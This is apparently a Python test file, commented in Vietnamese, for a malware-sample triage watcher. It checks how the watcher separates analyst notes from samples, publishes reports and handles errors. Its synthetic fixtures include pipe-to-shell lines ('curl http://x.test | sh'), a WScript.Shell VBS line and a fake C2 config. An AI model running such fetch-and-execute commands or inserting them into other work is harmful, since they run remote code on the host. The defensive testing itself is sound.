#!/usr/bin/env python3
"""watch theo dõi cả một cây thư mục mẫu: thư mục con, bản giải nén cùng cấp (REA_WATCH_ALIAS_SUFFIX), ghi chú thu mẫu đi kèm,
mẫu đã có báo cáo, trần số case mới mỗi vòng, đường dẫn báo cáo. Dữ liệu tổng hợp. Chạy: python3 tests/check_watch_tree.py"""
import os, sys, shutil, hashlib, tempfile
SKILL = os.path.dirname(os.path.dirname(os.path.abspath(__file__))); sys.path.insert(0, SKILL)
import watch  # noqa: E402

T = tempfile.mkdtemp(prefix='rea-wtree-'); inbox = os.path.join(T, 'IN'); old = os.getcwd()
def w(p, b):
    os.makedirs(os.path.dirname(p), exist_ok=True); open(p, 'wb').write(b); os.utime(p, (1, 1)); return p
sha = lambda p: hashlib.sha256(open(p, 'rb').read()).hexdigest()
a = w(os.path.join(inbox, 'U1', 'a.zip'), b'PK\x03\x04zip')
s = w(os.path.join(inbox, 'U1_extracted', 'a', 's.bin'), b'\x7fELF' + b'\0' * 60); h = sha(s)
n1 = w(os.path.join(inbox, 'U1_extracted', 'a', 's.txt'), b'# host=m1\n$ ls -la /x/s\n')        # tên bắt đầu bằng tên mẫu
n2 = w(os.path.join(inbox, 'U1_extracted', 'a', 'host.log'), (h + '  /usr/lib/x\n').encode())   # nhắc sha256 của mẫu cùng thư mục
n3 = w(os.path.join(inbox, 'U1_extracted', 'a', 'SHA256SUMS'), (h + '  s.bin\n').encode())
f4 = w(os.path.join(inbox, 'U2', 'tool.sha256'), b'#!/bin/sh\necho x\n')   # tên dạng SUMS nhưng nội dung không phải danh sách sha256: là mẫu
sc = w(os.path.join(inbox, 'U1_extracted', 'a', 'install.sh'), ('#!/bin/sh\n# ' + h + '\necho x\n').encode())   # script thật có hash payload: vẫn là mẫu
t1 = w(os.path.join(inbox, 'U2', 'k.txt'), b'curl http://x.test | sh\n'); t2 = w(os.path.join(inbox, 'U2', 'k.log'), b'log\n')   # hai file text cạnh nhau: vẫn là mẫu
b = w(os.path.join(inbox, 'U3', 'r.tar.gz'), b'\x1f\x8b\x08')
d1 = w(os.path.join(inbox, 'U1_extracted', 'a', 's.bin.txt'), b'#!/bin/sh\ncurl http://x.test/p | sh\n')
d2 = w(os.path.join(inbox, 'U1_extracted', 'a', 's.log'), b'Set o = CreateObject("WScript.Shell")\n')   # VBS mang tên ghi chú: là mẫu   # tên giống ghi chú nhưng nội dung là script: vẫn là mẫu
n4 = w(os.path.join(inbox, 'U1_extracted', 'a', 'thu.txt'), '# host=srv1 collector=x\n$ ls -la /x/s.bin\nthu\n'.encode())   # tiêu đề + lệnh thu mẫu
n5 = w(os.path.join(inbox, 'U1_extracted', 'a', 'cmd.txt'), '$ sha256sum /x/s.bin\nok\n'.encode())   # lệnh thu mẫu trên file cùng thư mục
m1 = w(os.path.join(inbox, 'U1_extracted', 'a', 'cfg.txt'), b'# a=1\nx\n'); m3 = w(os.path.join(inbox, 'U1_extracted', 'a', 'conf.txt'), b'# c2=a.test port=443\nkey=1\n'); m2 = w(os.path.join(inbox, 'U1_extracted', 'a', 'cmd2.txt'), '$ ls /x/khac.bin\n'.encode())   # một cặp khóa, lệnh trên file không có: là mẫu
ws = os.path.join(T, 'Report_IN', '.cases'); os.makedirs(ws); os.chdir(ws)
try:
    watch.ALIAS = ''
    got = set(watch.samples(inbox)); assert a in got and s in got, got   # không cấu hình hậu tố: quét cả hai
    watch.ALIAS = '_extracted'
    got = set(watch.samples(inbox)); assert a not in got and s in got and b in got, got   # có U1_extracted thì bỏ U1
    assert all(watch.note_of(p) for p in (n1, n2, n3, n4, n5)) and not any(watch.note_of(p) for p in (m1, m2, m3, s, sc, t1, t2, b, d1, d2, f4))
    root = watch.report_root(inbox, 'IN'); assert root == os.path.join(T, 'Report_IN') and watch.report_root(inbox, None) is None
    assert watch.report_root(inbox, os.path.join(T, 'khac')) == os.path.join(T, 'khac')
    assert watch.stem('x.tar.gz') == 'x' and watch.stem('a.bin') == 'a.bin'
    c = os.path.join(ws, 'c1'); os.makedirs(os.path.join(c, 'report')); open(os.path.join(c, 'report', 'report-2026-01-01.md'), 'w').write('# r\n')
    out = watch.publish(c, {'source': s, 'inbox': inbox, 'report': 'IN', 'sha256': h})   # X_extracted/a -> Report/X/a
    assert out == os.path.join(root, 'U1', 'a') and os.path.isfile(os.path.join(out, 's.bin_data', 's.bin.md')), out
    assert watch.reported(root) == {h}
    s2 = w(os.path.join(T, 'other', 's.bin'), b'\x7fELF' + b'\1' * 60); h2 = sha(s2)   # mẫu khác cùng tên, cùng chỗ: không ghi đè báo cáo cũ
    out2 = watch.publish(c, {'source': s, 'inbox': inbox, 'report': 'IN', 'sha256': h2})
    assert out2 == out and os.path.isdir(os.path.join(out, f's.bin_{h2[:8]}_data')) and watch.reported(root) == {h, h2}, os.listdir(out)
    shutil.rmtree(os.path.join(out, f's.bin_{h2[:8]}_data'))
    out = watch.publish(c, {'source': b, 'inbox': inbox, 'report': 'IN'})   # mẫu nằm thẳng trong thư mục cấp một: thư mục riêng theo tên bỏ đuôi nén
    assert out == os.path.join(root, 'U3', 'r') and os.path.isfile(os.path.join(out, 'r.tar.gz_data', 'r.tar.gz.md')), out
    shutil.rmtree(out)
    assert h2 in watch.reported(root)   # bộ đệm: báo cáo bị xóa chỉ hết tính sau REPORTED_TTL giây (publish tự thêm sha mới)
    watch._REPORTED.clear()
    # ingest: mẫu đã có báo cáo, ghi chú, thư mục báo cáo và workspace không thành case; trần số case mới mỗi vòng
    watch.SETTLE = 0; watch.flow = lambda *x: type('R', (), {'returncode': 0, 'stdout': '', 'stderr': ''})()
    made = lambda: sorted(x for x in os.listdir(ws) if os.path.exists(os.path.join(ws, x, 'work', 'watch.json')))
    watch.MAXN = 2; watch.ingest(inbox, 'IN'); assert len(made()) == 2, made()
    watch.MAXN = 20; watch.ingest(inbox, 'IN'); m = made()
    assert len(m) == 10 and sorted(x.split('_')[0] for x in m) == ['cfg', 'cmd2', 'conf', 'install', 'k', 'k', 'r', 's', 's', 'tool'], m   # s.bin đã có báo cáo: không làm lại
    watch._NOTED.clear(); watch.ingest(inbox, 'IN')   # khởi động lại watcher: không ghi lặp vào log
    L = open(os.path.join(ws, watch.NOTES_LOG), encoding='utf-8').read().splitlines()   # ghi chú bị bỏ qua được ghi lại, mỗi file một lần
    assert sorted(x.split('\t')[1] for x in L) == sorted([n1, n2, n3, n4, n5]) and 'nhắc sha256 của s.bin' in '\n'.join(L), L
    # chép báo cáo lỗi: case chưa đóng, vòng sau chép lại; report --final chỉ chạy một lần
    calls = []
    def fl(*x): calls.append(x); return type('R', (), {'returncode': 0, 'stdout': 'DONE\n', 'stderr': ''})()
    def bad(*x): raise OSError('đĩa đầy')
    watch.flow = fl; cc = os.path.join(ws, m[0]); watch.publish = bad; watch.step(cc, None, 'IN'); st = watch.load(cc)
    assert not st.get('stop') and st['final'] and 'đĩa đầy' in st['publish_error'], st
    def bad2(*x): raise ValueError('facts.jsonl:3: dòng hỏng')   # lỗi không phải OSError cũng không làm sập watcher; quá PUBFAIL lần thì dừng báo người
    watch.publish = bad2; watch.PUBFAIL = 2; watch.step(cc, None, 'IN'); st = watch.load(cc)
    assert 'lỗi 2 lần liên tiếp' in st.get('stop', '') and 'ValueError' in st['stop'] and 'publish_fail' not in st, st
    st.pop('stop'); watch.save(cc, st); watch.step(cc, None, 'IN'); st = watch.load(cc)   # người mở lại case: đếm lại từ 0, lần lỗi kế chưa dừng
    assert not st.get('stop') and st['publish_fail'] == 1, st
    watch.publish = lambda *x: '/x'; watch.step(cc, None, 'IN'); st = watch.load(cc)
    assert st['stop'].startswith('DONE') and st['published'] == '/x' and 'publish_error' not in st and 'publish_fail' not in st, st
    assert [x[0] for x in calls].count('report') == 1, calls
    st = watch.load(cc); st.pop('stop'); watch.save(cc, st)   # case mở lại (vd. người xóa stop sau khi sửa fact): bỏ cờ final
    watch.flow = lambda *x: type('R', (), {'returncode': 0, 'stdout': 'NEED_REVIEW\n', 'stderr': ''})(); watch.step(cc, None, 'IN')
    assert 'final' not in watch.load(cc), watch.load(cc)
finally:
    os.chdir(old); shutil.rmtree(T, ignore_errors=True)
print('OK check_watch_tree')
